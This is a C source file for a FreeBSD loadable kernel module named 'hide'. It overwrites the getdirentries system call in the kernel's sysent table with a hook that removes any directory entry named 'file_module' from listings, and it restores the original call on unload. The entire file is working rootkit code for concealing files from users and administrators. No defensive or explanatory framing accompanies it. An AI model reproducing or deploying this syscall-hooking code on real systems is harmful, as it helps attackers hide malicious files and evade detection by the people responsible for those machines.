#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>
#include <sys/malloc.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

#include <sys/dirent.h>
#include <sys/malloc.h>


static int getdirentries_hook(struct thread *td, void *syscall_args)
{

	struct getdirentries_args *uap;
	uap = (struct getdirentries_args *)(syscall_args);

	struct dirent *dp;
	struct dirent *current;

	size_t size;
	size_t count;

	sys_getdirentries(td, syscall_args);
	size = td->td_retval[0];

	if (size > 0)
	{
		dp = malloc(size, M_TEMP, M_NOWAIT);
		copyin(uap->buf, dp, size);

		current = dp;
		count = size;

		while ((current->d_reclen != 0) && count > 0)
		{
			count -= current->d_reclen;

			if (strcmp((char *)&(current->d_name), "file_module" ) == 0)
			{
				if (count != 0)
				{
					bcopy((char *)current + current->d_reclen, current, count);
				}

				size -= current->d_reclen;
				break;
				
			}

			if (count != 0)
				current = (struct dirent *)((char *)current + current->d_reclen);


		}
	
		td->td_retval[0] = size;
		copyout(dp, uap->buf, size);
		free(dp, M_TEMP);

	}

	return 0;
}



static int load(struct module *module, int cmd, void *arg)
{
	switch (cmd)
	{
		case MOD_LOAD:
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)getdirentries_hook;
			break;

		case MOD_UNLOAD:
			sysent[SYS_getdirentries].sy_call = (sy_call_t *)sys_getdirentries;
			break;

	}


	return 0;
}

static moduledata_t hide_mod = {
	"hide",
	load,
	NULL
};

DECLARE_MODULE(hide, hide_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);
